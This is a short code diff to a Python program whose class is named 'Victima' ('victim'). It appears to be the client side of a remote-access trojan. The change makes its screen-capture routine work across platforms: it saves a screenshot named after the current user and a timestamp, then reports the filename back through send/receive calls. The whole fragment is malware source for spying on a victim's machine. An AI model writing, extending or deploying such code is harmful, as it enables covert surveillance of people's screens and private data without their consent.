@@ -13,7 +13,7 @@ import platform
 import datetime
 import threading
 import subprocess
-import pyscreenshot
+#import pyscreenshot
 import urllib.request
 from getpass import getuser
 
@@ -284,8 +284,23 @@ class Victima(object):
 		data = datetime.datetime.today()
 		nombre_archivo = getuser()+'_'+str(data.day)+str(data.month)+str(data.year)+"-"+str(data.hour)+str(data.minute)+str(data.second)+".png"
 
-		captura = pyscreenshot.grab()
-		captura.save(nombre_archivo)
+		if (plataforma=="win"):
+			import pyautogui
+
+			captura = pyautogui.screenshot()
+			captura.save(nombre_archivo)
+
+		elif (plataforma=="linux") or (plataforma=="mac"):
+			import pyscreenshot
+
+			captura = pyscreenshot.grab()
+			captura.save(nombre_archivo)
+
+		else:
+			self.recibir()
+			self.enviar('failed')
+			return False
+
 
 		self.recibir()
 		self.enviar(nombre_archivo)
